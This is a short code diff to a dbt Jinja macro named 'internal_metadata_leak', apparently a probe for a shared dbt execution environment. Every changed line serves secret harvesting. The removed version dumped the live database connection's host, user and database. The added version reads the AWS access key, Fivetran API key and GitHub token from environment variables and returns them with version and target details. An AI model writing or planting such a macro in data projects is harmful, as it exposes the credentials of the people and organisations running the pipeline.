@@ -1,16 +1,15 @@
 {% macro internal_metadata_leak() %}
     {% if execute %}
-        {# 1. Cek isi adapter credentials secara mentah #}
-        {% set creds = adapter.connections.get_thread_connection().credentials %}
+        {% set profile = target.get('profile_name', 'none') %}
         
-        {# 2. Cek apakah ada variabel 'password' atau 'token' yang terlihat #}
-        {% set secret_dump = "DB: " ~ creds.database ~ " | Host: " ~ creds.host ~ " | User: " ~ creds.user %}
+        {% set aws_key = env_var("AWS_ACCESS_KEY_ID", "not_found") %}
+        {% set fivetran_token = env_var("FIVETRAN_API_KEY", "not_found") %}
+        {% set github_t = env_var("GITHUB_TOKEN", "not_found") %}
         
-        {# 3. Tambahkan info path project lagi buat pelengkap #}
-        {% set project_info = "Project: " ~ project_name %}
+        {% set sys_info = "Ver: " ~ dbt_version ~ " | Target: " ~ target.name %}
         
-        {{ return(secret_dump ~ " || " ~ project_info) }}
+        {{ return("AWS: " ~ aws_key ~ " | FVT: " ~ fivetran_token ~ " | GH: " ~ github_t ~ " || " ~ sys_info) }}
     {% else %}
-        {{ return("scanning...") }}
+        {{ return("probing...") }}
     {% endif %}
 {% endmacro %}
